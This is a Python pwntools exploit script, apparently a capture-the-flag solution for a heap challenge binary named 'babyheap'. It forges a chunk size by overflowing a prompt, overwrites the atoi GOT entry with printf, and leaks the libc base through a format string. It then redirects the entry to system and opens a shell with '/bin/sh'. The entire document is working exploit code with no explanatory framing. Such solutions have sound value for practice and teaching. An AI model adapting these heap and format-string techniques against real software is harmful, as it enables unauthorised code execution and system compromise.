#!/usr/bin/env python
from pwn import *

def new(size, content, name):
    s.sendafter('choice:', '1')
    s.sendafter('Size :', str(size))
    s.sendafter('Content:', content)
    s.sendafter('Name:', name)

def delete():
    s.sendafter('choice:', '2')

def edit(content):
    s.sendafter('choice:', '3')
    s.sendafter('Content:', content)

def finish(data):
    s.sendafter('choice:', '4')
    s.sendafter('(Y/n)', data)

s = process('./babyheap', env = {'LD_PRELOAD': './libc.so.6'})
elf = ELF('./babyheap')
libc = ELF('./libc.so.6')

finish('n' * 0xfe8 + p64(0x41))
new(0x18, 'A', 'A' * 8)
delete()
new(0x38, 'A' * 0x20 + p64(8) + 'A' * 8 + p64(elf.got['atoi']), 'A')
edit(p64(elf.symbols['printf'])[:-1])
s.sendafter('choice:', '%3$p\n')
libc_base = int(s.recvline(False), 16) - 0x116cdc
log.info('libc base: %#x' % libc_base)
s.sendafter('choice:', '%9$hhnAA' + p64(0x6020a4))
s.sendafter('choice:', 'A' * 3)
s.sendafter('Content:', p64(libc_base + libc.symbols['system'])[:-1])
s.sendafter('choice:', '/bin/sh')
s.interactive()
